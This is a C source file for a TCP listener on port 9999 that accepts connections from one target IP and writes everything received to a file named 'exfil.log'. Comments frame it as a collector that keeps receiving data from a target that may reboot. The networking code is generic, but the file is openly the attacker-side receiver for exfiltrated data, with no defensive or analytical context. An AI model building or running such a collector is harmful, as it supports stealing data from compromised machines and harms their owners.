#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define LISTEN_PORT 9999       
#define LOG_FILE "exfil.log"
#define BUFFER_SIZE 4096

int main(int argc, char *argv[]) {
    // Check command-line parameters: ./log <IP>
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <TARGET_IP>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *target_ip_str = argv[1];
    struct in_addr target_ip;
    if (inet_pton(AF_INET, target_ip_str, &target_ip) <= 0) {
        fprintf(stderr, "Invalid target IP address: %s\n", target_ip_str);
        exit(EXIT_FAILURE);
    }

    // Ignore the SIGPIPE signal to prevent the process from crashing 
    // when the opposite end restarts or disconnects abnormally.
    signal(SIGPIPE, SIG_IGN);

    // 3. Create TCP Socket
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Enable port reuse (SO_REUSEADDR) to facilitate quick restart and debugging.
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // Bind the local address and port
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen all network cards
    server_addr.sin_port = htons(LISTEN_PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Start to listen
    if (listen(server_fd, 5) < 0) {
        perror("listen");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Open log file which append binary
    FILE *log_fp = fopen(LOG_FILE, "ab");
    if (!log_fp) {
        perror("fopen");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    //  Continuously receive connections from $TARGET that probably rebbot
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        int client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) {
            if (errno == EINTR) continue; // If the signal is interrupted, continue.
            perror("accept");
            continue;
        }

        // Only accept connections from $TARGET
        if (client_addr.sin_addr.s_addr != target_ip.s_addr) {
            close(client_fd);
            continue;
        }

        // Read Data and Write into Log
        char buffer[BUFFER_SIZE];
        ssize_t bytes_read;
        while ((bytes_read = recv(client_fd, buffer, sizeof(buffer), 0)) > 0) {
            // Write to the file and immediately flush the buffer to make sure data remaining when process killed
            fwrite(buffer, 1, bytes_read, log_fp);
            fflush(log_fp);

            // Standard Output
             fwrite(buffer, 1, bytes_read, stdout);
             fflush(stdout);
        }

        close(client_fd);
    }

    fclose(log_fp);
    close(server_fd);
    return 0;
}
